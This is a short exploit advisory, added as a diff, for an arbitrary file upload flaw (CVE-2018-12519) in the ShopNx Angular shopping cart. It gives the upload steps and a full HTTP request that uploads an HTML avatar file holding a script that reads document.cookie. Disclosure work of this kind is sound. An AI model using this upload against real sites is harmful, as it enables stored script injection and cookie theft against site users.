@@ -1,0 +1,54 @@
+# Exploit Title: ShopNx - Angular5 Single Page Shopping Cart Application 1 - Arbitrary File Upload
+# Date: 2018-07-03
+# Exploit Author: L0RD
+# Email: borna.nematzadeh123@gmail.com
+# Vendor Homepage: http://codenx.com/
+# Version: 1
+# CVE: CVE-2018-12519
+# Tested on: Win 10
+===================================================
+# Description :
+ShopNx 1 is an Angular 5 single page application which suffers from
+arbitrary file upload vulnerability .
+Attacker can upload malicious files on server because
+the application fails to sufficiently sanitize user-supplied input.
+
+# POC :
+1) Login as a regular user and navigate to "edit profile"
+2) Click on "Avatar" and upload your HTML file which contains malicious javascript code.
+3) You can find your uploaded file here :
+   Path : http://shop.codenx.com/uploads/[Your File]
+
+
+# Request :
+=========================
+POST /api/media HTTP/1.1
+Host: site.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0)
+Gecko/20100101 Firefox/61.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://site.com/account/edit-profile
+Content-Length: 367
+Content-Type: multipart/form-data;
+boundary=---------------------------31031276124582
+Connection: keep-alive
+
+-----------------------------31031276124582
+Content-Disposition: form-data; name="file"; filename="file.html"
+Content-Type: text/html
+
+<html>
+<head>
+<title>TEST</title>
+</head>
+<body>
+    <script>
+        console.log(document.cookie);
+    </script>
+</body>
+</html>
+-----------------------------31031276124582--
+
+====================================================
